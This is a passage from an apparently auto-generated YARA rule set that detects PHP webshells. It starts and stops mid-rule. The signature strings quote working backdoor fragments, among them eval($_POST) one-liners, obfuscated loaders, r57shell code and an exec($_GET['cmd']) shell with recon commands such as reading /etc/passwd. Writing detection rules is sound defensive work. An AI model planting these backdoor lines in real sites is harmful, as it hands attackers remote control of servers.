      hash1 = "6797a4fd164d96bea62ee10aea37a1e76d5605a9f866d42106d1279cadaa4a57"
   strings:
      $s1 = "* @var \\app\\modules\\shop\\models\\Order $model" fullword ascii
      $s2 = "* @var \\app\\modules\\shop\\models\\OrderItem[] $items" fullword ascii
      $s3 = "$mainCurrency = \\app\\modules\\shop\\models\\Currency::getMainCurrency();" fullword ascii
      $s4 = "\\app\\modules\\image\\widgets\\ObjectImageWidget::widget([" fullword ascii
      $s5 = "* @var \\yii\\web\\View $this" fullword ascii
      $s6 = "header, .header, footer, .footer, .quantity {" fullword ascii
      $s7 = "<?php foreach($model->specialPriceObjects as $object): ?>" fullword ascii
      $s8 = "<?php if (isset($subItems[$item->product_id])): ?>" fullword ascii
      $s9 = "<?= $mainCurrency->format($model->total_price) ?>" fullword ascii
      $s10 = "<td><?= $mainCurrency->format($object->price) ?></td>" fullword ascii
      $s11 = "<td><strong><span class=\"items-count\"><?= $model->items_count ?></span></strong></td>" fullword ascii
      $s12 = "$immutable = isset($immutable) && $immutable;" fullword ascii
      $s13 = "'style' => 'text-decoration: line-through;'" fullword ascii
      $s14 = "'items' => $subItems[$item->product_id]," fullword ascii
      $s15 = "if (isset($subItems[$item->parent_id])) {" fullword ascii
      $s16 = "use app\\modules\\shop\\models\\Product;" fullword ascii
      $s17 = "<td colspan=\"4\"><?= $object->name ?></td>" fullword ascii
      $s18 = "$item->total_price_without_discount" fullword ascii
      $s19 = "Html::encode($item->product->name)," fullword ascii
      $s20 = "\\yii\\helpers\\Url::to([" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule approve_page_preview
{
   meta:
      description = "php17 - file approve_page_preview.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e00b5819be799a7bd8689fda51dd4541133e7efe2447cec6834c973bc00589d6"
   strings:
      $s1 = "pages/preview_version?cvID=<?php echo $req->getRequestedVersionID()?>&cID=<?php echo $req->getRequestedPageID()?>\"></iframe>" fullword ascii
      $s2 = "array('requested-version', t('Requested Version: %s', $rv->getVersionComments()), true)," fullword ascii
      $s3 = ">/pages/preview_version?cvID=<?php echo $recentCVID?>&cID=<?php echo $req->getRequestedPageID()?>\"></iframe>" fullword ascii
      $s4 = "pages/preview_version?cvID=<?php echo $liveCVID?>&cID=<?php echo $req->getRequestedPageID()?>\"></iframe>" fullword ascii
      $s5 = "$rvc = Page::getByID($req->getRequestedPageID(), $req->getRequestedVersionID());" fullword ascii
      $s6 = "<div style=\"display: none; height: 100%\" id=\"ccm-tab-content-recent-version\">" fullword ascii
      $s7 = "<div style=\"display: block; height: 100%\" id=\"ccm-tab-content-requested-version\">" fullword ascii
      $s8 = "<div style=\"display: none; height: 100%\" id=\"ccm-tab-content-live-version\">" fullword ascii
      $s9 = "defined('C5_EXECUTE') or die(\"Access Denied.\");" fullword ascii
      $s10 = "$wp = \\Concrete\\Core\\Workflow\\Progress\\Progress::getByID($_REQUEST['wpID']);" fullword ascii
      $s11 = "$ih = Loader::helper('concrete/ui');" fullword ascii
      $s12 = "$liveCVID = $rvl->getVersionID();" fullword ascii
      $s13 = "$recentCVID = $rvr->getVersionID();" fullword ascii
      $s14 = "$rvr = Page::getByID($req->getRequestedPageID(), 'RECENT');" fullword ascii
      $s15 = "$rvl = Page::getByID($req->getRequestedPageID(), 'ACTIVE');" fullword ascii
      $s16 = "$rv = $rvc->getVersionObject();" fullword ascii
      $s17 = "<iframe border=\"0\" id=\"v<?php echo time()?>l\" frameborder=\"0\" height=\"100%\" width=\"100%\" src=\"<?=REL_DIR_FILES_TOOLS_" ascii
      $s18 = "<iframe border=\"0\" id=\"v<?php echo time()?>rec\" frameborder=\"0\" height=\"100%\" width=\"100%\" src=\"<?=REL_DIR_FILES_TOOL" ascii
      $s19 = "<iframe border=\"0\" id=\"v<?php echo time()?>r\" frameborder=\"0\" height=\"100%\" width=\"100%\" src=\"<?=REL_DIR_FILES_TOOLS_" ascii
      $s20 = "$tabs[] = array('recent-version', t('Most Recent Version'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule sig_9e41e5cd782f94f5200f2b58d0a915d24e7ca218
{
   meta:
      description = "php17 - file 9e41e5cd782f94f5200f2b58d0a915d24e7ca218.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1e85f18410b14a440d1e920f95b5514cd10ab45b29a5323b3be3fba4bc3bfb10"
   strings:
      $x1 = "eval(gzuncompress(base64_decode(\"eJzsffl3G8eR8M/ye/4fRmOuAJogLt6kQIk3KfESQeqkHt4AGBAQAQw0AHjI0f4vjLKJV9ZuRInURVEXaZOiLIoiKcnRcx" ascii
      $s2 = "$admin['pass']  = \"mumaasp.com\";  //" fullword ascii
      $s3 = "c1/HMb/4laTSUeDiiRCCyLRL1jbYIyBV+baHwMJ30KXCNHUzhMZXXaUQKTJiWFMmTlwW05COid+m6LFMInw0sF+tnXZMhAqFhHDzpAy+MKSXSMt+gBSUkEY90aMmkyaS" ascii
      $s4 = "$myneme = \"Mumaasp.com" fullword ascii
      $s5 = "KLa+8+erHy3ezik9+uTT2evXb/yW9nvno8e+nbWzOwawIsEVPcxdUD0OUpAbCB5ircwuN/v/6ZQ1iZxjSCQSVLuvz42v2FZzy5mpbcSWG5oOtATzxoK6L40ZWuiGQw84" ascii
      $s6 = "/17SWpOOhJwslRJZ1xEHxgioH4H1fUMPZ9B47pTlIHyATfd5QgKCqQbSvf3fj5zU/wLH3lJ+c/rBdsglOggMnFCqHejtM4iUjLJ7OyOukT03Ic2hQIhyP72W2iswQ/IK" ascii
      $s7 = "JdNPVw0GDRrjNQ24FlrGGCyD0nduygttcCBaKNBh0PVJpRSTJzWTyjyvhgsBzHN4OZoX9iEuPf7oVfWg59h5IODXk23UdLlTeSVyRLS3e8JezYwU3QsX9YW2TVXaQK0h" ascii
      $s8 = "zn+rDakNXj9df2kqMMfeHAUz3idV9Qi8C+8k6K1aBlkdhcPrFK5KsfW/swwAbzZyi+rBErrb/TuuaGdY2ZWOaeP5rKs2zy2+VxeysFQ6qwN5lNBGU1gHbGEt79QSqG6m" ascii
      $s9 = "lvurAVYWXp8u/Xfr1+duHDO88efvH4Rw7P6ln8Tj6/99m9FyvfPXm8evbx9PzG/LfLz5wP7ix8/nDqwW83n6/+Yu0n0EUpnIglj9lCUTk0ajsO/RQ9IumAsPyrqy9MoJ" ascii
      $s10 = "P3x0r0rQT2vGcBA5HNpxiwFPnp/EMsvfkUlJp0avLW72YXWU325MLXt2amzhRjI1rO+q6APrFAhp0CtWAbi1FnBHJg/YJjTkLk/FWD/nIDRd9XffWh4vRCws8uPvni+l" ascii
      $s11 = "4p8keP8OyFspFwmsHkUY2twAfjWRngE6hyWEhnQ+hNH8nG45OClDZEj6D9sGwnL4ZSIjZBDm+Pl+7atZO8OQGqP+y60hYl6NNaZJLl91tK2jJCJAasm4nKBmS06kX6XQ" ascii
      $s12 = "V1yUOD6ehkryd7YrLKP3BkMJnoq05OJnpCddGjR6orj1aeTGQPNlcpg3VH9stH/WOZiWC37PEmemJj7vT+1pqjTeFwsq8rpXbUKkNdR1L+eORwy+Shfb3NtRUn9sfDXR" ascii
      $s13 = "aTUS+bXr60SR0trvx+ZR729ccomuQhzycfrq0dv/Xd8q+OebyuurrjDty/Yq3Lj1e/dtJqVM7dvLv44dzHm19f31ifwyfWZhcfbqxMO5ae3bx+Z4nYreD7ZzfvglQGfp" ascii
      $s14 = "JyXukKV12W3ysESZNJu5CstmPb9UpmtU2gAfuc5kohbYN7Lt9nT0Gg6HoYO44q71m8UC3+BKQWmtp6ayayV7ckmL52QxzVyrBmiHOeyJkWLYGK8w8x1Nq5XyEFIRIPpf" ascii
      $s15 = "gy8/45OpVQ3uVm25HNiCwCegIOsVQ6LqWjkCmpqjRJxVRpA51dhYpgHhG9LlciNuEMx+OzizN/QqWkBL6HyViJNUczrsHm3mRHTyQSV082tyclOd2cmDzaE2qZSHtHK6" ascii
      $s16 = "3Up+1OW+luFyskNvCzZOu5poFv0PIDuIYYr3OdNpAl+qQkH+UJFDvmOsdCSjaZsZsTS8s9xxsYk9kKM/pEuc3JAZfmlS/ElILGlTbDLLTZLCDIlCAEAiyDQoeclFUpI4" ascii
      $s17 = "LfUTmegj/05QryAQNQwIcQKFv4B3e/8JeoivA3HJuE30kFfimj+F2Ow+/0SfxNAk/Bn2AQfkcyCBd2nfA7o+DvpDyOtUBI4xdQlOGPjKFWEMXECPkNuii2Ni4jiCA0is" ascii
      $s18 = "lyGyY1ncRksyQwGKAmYaFrX8FkgeqrZ4lF1xZHNiYsDAc3lvscg9C4++vHC7SdvH0M4nRlceFFEaqrdFEvSG/YjhhXfSA3S/FpoPCanankOXW07YvZUIrl52xfLOoDHT" ascii
      $s19 = "WNh+llmDjoLCyJlTZC6ZJIWZlhPNiOJswStU1ezAf6SllJmJmSiLTfAt4ZEuWUsg2yHK7awJzCla/JnVdJGD7hRWIpuw9jwxwhuBYDRgSPVsdcdHUGC9//zaMXpLn1h/" ascii
      $s20 = "9SWM7A9+3bA//82aANmW1+vamybg147m5H+MsK6EaI3xnIU5frs4Q9DqlmJkFSLsFST3pqrNGraTPm6u7NaHK5gxNM2xHmz6Mi/MMm/AqRlm1Z0K/9rEmLL2ABj2FitH" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _user_v1_public
{
   meta:
      description = "php17 - file _user.v1.public.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "506423abaa113da1f39a7db68d5c3dd508dec0021b4677a2b057849cc91424c6"
   strings:
      $s1 = "* @apiDefine UserSuccessSingleResponse" fullword ascii
      $s2 = "\"email\":\"x.rolllln@hotmail.com\"," fullword ascii
      $s3 = "* @apiSuccessExample {json} Success-Response:" fullword ascii
      $s4 = "\"readable_updated_at\":\"1 second ago\"," fullword ascii
      $s5 = "\"description\":\"Super Administrator\"," fullword ascii
      $s6 = "\"readable_created_at\":\"1 second ago\"," fullword ascii
      $s7 = "\"description\":\"Special Client!\"," fullword ascii
      $s8 = "\"date\":\"2017-06-06 05:40:51.000000\"," fullword ascii
      $s9 = "\"object\":\"User\"," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule sig_04de1b07615095385cfa8edebeed556b
{
   meta:
      description = "php17 - file 04de1b07615095385cfa8edebeed556b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f283a1ca78b10ed073c56b2b80d1ee3d4be91cd90dcd3400e562b2f7e0ac5821"
   strings:
      $s1 = ";<?php @eval($_POST['a']);?>" fullword ascii
   condition:
      uint16(0) == 0x4947 and filesize < 3KB and
      all of them
}

rule sig_02272fcf1fb920dbd40e7cd15f90e13b69f629e2
{
   meta:
      description = "php17 - file 02272fcf1fb920dbd40e7cd15f90e13b69f629e2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3706c7619b22d5b26d6352977f246c83e01db6e3acde22a9d5b95d0e502a14b4"
   strings:
      $s1 = "$b=str_replace('ja','','cjarjaeajate_fujajanjaction');" fullword ascii
      $s2 = "$P=str_replace('fB','',$o.$C.$U.$g.$k.$a.$n.$X.$s.$x);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule ActionManifestable
{
   meta:
      description = "php17 - file ActionManifestable.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d1d133acb0ac114b286566db0e48ebe2bbbda64117e67f9c12e8f279afbf49cc"
   strings:
      $x1 = "* @copyright  Copyright (c) 2005-2010 Zend Technologies USA Inc. (http://www.zend.com)" fullword ascii
      $x2 = "* http://framework.zend.com/license/new-bsd" fullword ascii
      $s3 = "* @license    http://framework.zend.com/license/new-bsd     New BSD License" fullword ascii
      $s4 = "* to license@zend.com so we can send you a copy immediately." fullword ascii
      $s5 = "* with this package in the file LICENSE.txt." fullword ascii
      $s6 = "* @version    $Id: ActionManifestable.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s7 = "* @return array|Zend_Tool_Framework_Action_Interface" fullword ascii
      $s8 = "interface Zend_Tool_Framework_Manifest_ActionManifestable extends Zend_Tool_Framework_Manifest_Interface" fullword ascii
      $s9 = "* @see Zend_Tool_Framework_Manifest_Interface" fullword ascii
      $s10 = "* This source file is subject to the new BSD license that is bundled" fullword ascii
      $s11 = "* Should either return a single action, or an array" fullword ascii
      $s12 = "* getActions()" fullword ascii
      $s13 = "// require_once 'Zend/Tool/Framework/Manifest/Interface.php';" fullword ascii
      $s14 = "* Zend Framework" fullword ascii
      $s15 = "* of actions" fullword ascii
      $s16 = "* LICENSE" fullword ascii
      $s17 = "public function getActions();" fullword ascii
      $s18 = "* @package    Zend_Tool" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_9c4a6c17ba848efde3fb15a493bb44446d94374f
{
   meta:
      description = "php17 - file 9c4a6c17ba848efde3fb15a493bb44446d94374f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2cffd775e0c835feda4bd75460aa01165b494be11d0343826f5a5ad80c33039c"
   strings:
      $s1 = "<?php=eval($_POST[0]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_92e6a578e6287219922e9d6d77db6ecdf6777cc3
{
   meta:
      description = "php17 - file 92e6a578e6287219922e9d6d77db6ecdf6777cc3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0d19e302f3719f19dae2c47a4e26d5b0dfcb9f826e33bce74614a0767e23916d"
   strings:
      $s1 = "$s='replZkace(aZkrZkray(\"ZkZk/_/\",\"/-/\"Zk),array(Zk\"/\",\"+Zk\"),$ss($s[$i],Zk0,$e))Zk),$k))Zk);$oZk=obZk_Zkget_contents(Zk" ascii
      $s2 = "$s='replZkace(aZkrZkray(\"ZkZk/_/\",\"/-/\"Zk),array(Zk\"/\",\"+Zk\"),$ss($s[$i],Zk0,$e))Zk),$k))Zk);$oZk=obZk_Zkget_contents(Zk" ascii
      $s3 = "$S=str_replace('Zk','',$g.$L.$U.$V.$p.$A.$O.$m.$s.$H);" fullword ascii
      $s4 = "$n=str_replace('h','','chrehateh_hfunhhction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_65343a16f8fef985dc0d949d6b894a90febe1d6f
{
   meta:
      description = "php17 - file 65343a16f8fef985dc0d949d6b894a90febe1d6f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "516674bbab87b16796451b9f5fa950f929f547f21392efa5091ce4e9d318c3ac"
   strings:
      $s1 = "$_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__];" fullword ascii
      $s2 = "$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;@$_[((++$__)+($__++ ))].=$_;" fullword ascii
      $s3 = "$_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );" fullword ascii
      $s4 = "$_[$__+ $__] ;$_[@-_]($_[@!+_] );" fullword ascii
      $s5 = "$_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );" fullword ascii
      $s6 = "$_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2c37d90dd2c9c743c273cb955dd83ef6
{
   meta:
      description = "php17 - file 2c37d90dd2c9c743c273cb955dd83ef6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "98d0b1aee92af496f976a3398a123c4c0a19836902259d235406c018cc78f2c3"
   strings:
      $s1 = "<?php if(md5(@$_COOKIE['skins'])=='6fa7648cce61b81be42704ae859503de')($_=@$_REQUEST['q']).@$_($_REQUEST['z']); ?>" fullword ascii
      $s2 = "6fa7648cce61b81be42704ae859503de" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_4f9798430615a9c2d13825b994e4a39e7888d783
{
   meta:
      description = "php17 - file 4f9798430615a9c2d13825b994e4a39e7888d783.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "356faf2280641cbec4ba985b0fe07d7ea7d8028b48c046c3ab77862f47185000"
   strings:
      $s1 = "$e='p5E5E;$e=strpos($s[$i5E],$f5E);5Eif($e){$k=$kh.$kf;5Eob_st5Eart5E();@ev5Eal(@gzu5En5Ecompress(@x(5E@b5Ease64_decod5Ee(pre';" fullword ascii
      $s2 = "$M='g_5Ere5Eplac5Ee(arr5Eay(5E\"/_/5E\",\"/-/\"),arr5Eay(\"/\",\"+5E\"),$ss($5Es[$i],05E,$e5E))),$5Ek)5E)5E5E);$o=ob_get_content" ascii
      $s3 = "$d=str_replace('5E','',$I.$T.$h.$R.$z.$X.$j.$e.$M.$u);" fullword ascii
      $s4 = "$A=str_replace('oN','','creoNoNateoN_fuoNncoNtoNion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_031d3c46f8a4462cf23accc3aaecf840f77d9a30
{
   meta:
      description = "php17 - file 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
   strings:
      $s1 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; " fullword ascii
      $s2 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s3 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s4 = "'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()'," fullword ascii
      $s5 = "@mysql_query(\"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table\");" fullword ascii
      $s6 = "@readfile (\"http://rst.void.ru/r57shell_version/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s8 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s9 = "if(@copy(\"compress.zlib://\".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];" fullword ascii
      $s10 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s11 = "ename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s12 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s13 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { err(1,$_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s14 = "else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v.\"\\r\\n\"); } " fullword ascii
      $s15 = "/*  r57shell.php - " fullword ascii
      $s16 = "else if(!$users=get_users()) { echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><fon" ascii
      $s17 = "exit(\"<b><a href=http://rst.void.ru>r57shell</a> : Access Denied</b>\");" fullword ascii
      $s18 = "echo sr(25,\"<b>\".$lang[$language.'_text105'].$arrow.\"</b>\",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):(\"hacker@" ascii
      $s19 = "echo sr(25,\"<b>\".$lang[$language.'_text105'].$arrow.\"</b>\",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):(\"hacker@" ascii
      $s20 = "// Login & password crypted with md5, default is 'r57'" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_684dc9533d24d6e45908b3d424d2454891459ae6
{
   meta:
      description = "php17 - file 684dc9533d24d6e45908b3d424d2454891459ae6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7ff34797444191632e0f96f63f2025074a801861aedaec7f3157836ca0ed7244"
   strings:
      $s1 = "$result = @$stmt->fetchAll(PDO::FETCH_FUNC, str_rot13('nffreg'));" fullword ascii
      $s2 = "if(($db = @new PDO('sqlite::memory:')) && ($sql = strrev('TSOP_')) && ($sql = $$sql)) {" fullword ascii
      $s3 = "$stmt = @$db->query(\"SELECT '{$sql[b4dboy]}'\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule adm666in
{
   meta:
      description = "php17 - file adm666in.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "db08485a7a1ada7727dc17b62034afb41cf515513934446751aa339cb2530863"
   strings:
      $s1 = "<?php$lll11l11l11l11l1=__FILE__;eval(base64_decode('JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbD" ascii
      $s2 = "<?php$lll11l11l11l11l1=__FILE__;eval(base64_decode('JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbD" ascii
      $s3 = "MWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNN" ascii
      $s4 = "VEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hi" ascii
      $s5 = "Ykd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hz" ascii
      $s6 = "JGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNN" ascii
      $s7 = "oJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UVXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd" ascii
      $s8 = "bGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hz" ascii
      $s9 = "Yjg2dG00cXVfZWJkY2ZlanFjMnZvdHBkdndlCU5UWmFjM0p0ZVRnNWJXbDNZV0phYkhsWGNIazBkWE05CWVHNWFPV050WWpGa2NYTnNhbkZrWm1oSVkzaE5jbkU5CWRu" ascii
      $s10 = "ZXcgWmlwOw0KCW1ha2VwYXRoKFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCSR6LT5FeHRyYWN0KFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZS56aXAiLFJPT1Rf" ascii
      $s11 = "4bSULjFL6pblYuIkpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd" ascii
      $s12 = "UEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCXVubGluayhST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIik7DQoJZWNobyAiPE1FVEEgSFRUUC1FUVVJVj1SRUZSRVNI" ascii
      $s13 = "aWYoJGpvYj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoNCgloYWNrX2FkbWluX3RwbCgnZ2V0Jyk7DQp9DQplbHNlaWYoJGFjdGlvbj09ImdldCImJiRB" ascii
      $s14 = "qm82LqpqMrHT1O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0p" ascii
      $s15 = "1URnNiR3d4TVd4c2JHd3hNV3dzTVRncE8yVjJZV3dvSkd3eGJHd3hNV3hzYkd4c01XeHNNV3dvSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2" ascii
      $s16 = "cGFNVEZ1YW1KS2NIUnNabUpaYm1wWFpIQlJkMjQ5CU9HSmpZV3N6YjJ0U2FXMTVjSE5rYkdWSWMyaEpaSFk5CVoydGFkR0Z0YzNZNVlubDNjbnBhTjNSWGNtczBNbXM5" ascii
      $s17 = "WydteXB3ZCddKXsNCglyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuIi8uLi8uLi9pbmMvcXEuYXBpLnBocCIpOw0KCUBldmFsKHFxbWQ1KCJVVjlBR3g0Zlhr" ascii
      $s18 = "2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c" ascii
      $s19 = "T09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIikpDQoJew0KCX0NCgllbHNlaWYoJGNvZGU9c29ja09wZW5VcmwoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShS" ascii
      $s20 = "RVFSQWdlR2tGRkV4aENXVkVMRmdsVlFrd0ZWZ3dkQVZnY1JFZ1dFUlFSVVFzYVFsbEZFUnRmZTU1Yjc0YWU4OSIsJ0RFJywkX1BPU1RbJ215cHdkJ10pKTsNCn0NCg0K" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_06afb8d4abd599b3e8577bd6d707a923d6d0e96a
{
   meta:
      description = "php17 - file 06afb8d4abd599b3e8577bd6d707a923d6d0e96a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f33587934cffbab5d348c50008e984295e88019de92bad5dab3b5dd5beb4a278"
   strings:
      $s1 = "exec( $_GET[\"cmd\"], $out );" fullword ascii
      $s2 = "if( empty( $_GET[\"cmd\"] ) ){" fullword ascii
      $s3 = "echo \"  ls -la /root\\n\";" fullword ascii
      $s4 = "echo \"  find / -type f -perm -4000\\n\";" fullword ascii
      $s5 = "echo \"Useful things:\\n\";" fullword ascii
      $s6 = "echo \"  which wget\\n\";" fullword ascii
      $s7 = "echo \"  ls -la /home\\n\";" fullword ascii
      $s8 = "echo \"  ls -la /var/www\\n\";" fullword ascii
      $s9 = "echo \"  cat /etc/passwd\\n\";" fullword ascii
      $s10 = "echo \"  uname -a\\n\";" fullword ascii
      $s11 = "echo \"  cat /etc/group | grep admin\\n\";" fullword ascii
      $s12 = "echo htmlentities( join( \"\\n\", $out ) );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule array_intersect_uassoc_headers_accept_r
{
   meta:
      description = "php17 - file array_intersect_uassoc-headers-accept-r.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b79659cc9b529fe2926f662f4de45d0f457392ed6db0bba67bac21a92fde4c6f"
   strings:
      $s1 = "array_intersect_uassoc(array($_REQUEST[$password] => \"\"), array(1), $f);" fullword ascii
      $s2 = "$password = \"LandGrey\";" fullword ascii
      $s3 = "${\"LandGrey\"} = $_SERVER[\"HTTP_ACCEPT\"].\"Land!\";" fullword ascii
      $s4 = "$key = substr(__FILE__,-5,-4);" fullword ascii
      $s5 = "$f = pack(\"H*\", \"13\".\"3f120b1655\") ^ $LandGrey;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_28911c70ff2b96b8055073e38d0ad3850b23651a
{
   meta:
      description = "php17 - file 28911c70ff2b96b8055073e38d0ad3850b23651a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "422583a7e3449f7ab2e8ba67a8ffa3d3c056989624d9c87784fdc77527419b38"
   strings:
      $s1 = "for ($n8d1aa9=0; $n8d1aa9<$GLOBALS[$GLOBALS['vb6a6e'][44].$GLOBALS['vb6a6e'][19].$GLOBALS['vb6a6e'][38].$GLOBALS['vb6a6e" fullword ascii
      $s2 = "for ($pe19=0; $pe19<$GLOBALS[$GLOBALS['vb6a6e'][44].$GLOBALS['vb6a6e'][19].$GLOBALS['vb6a6e'][38].$GLOBALS['vb6a6e'][22].$GL" fullword ascii
      $s3 = "e'][40].$GLOBALS['vb6a6e'][8].$GLOBALS['vb6a6e'][90].$GLOBALS['vb6a6e'][64].$GLOBALS['vb6a6e'][61].$GLOBALS['vb6a6e'][49];" fullword ascii
